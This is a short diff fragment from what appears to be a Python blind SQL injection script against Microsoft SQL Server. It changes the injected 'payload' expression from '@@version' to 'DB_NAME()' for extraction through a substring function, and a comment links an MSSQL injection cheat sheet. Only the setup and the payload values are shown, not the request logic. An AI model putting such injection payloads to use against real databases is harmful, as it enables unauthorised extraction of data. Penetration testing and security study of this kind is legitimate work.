@@ -15,7 +15,7 @@ headers = CaseInsensitiveDict()
 headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 data={}
 #This is the "payload" that will be inserted inside the substring function, modify it in order to get the query results.
-function = "(@@version)"
+function = "DB_NAME()"
 
 #A very good cheatsheet for MSSQL Databases --> https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
 
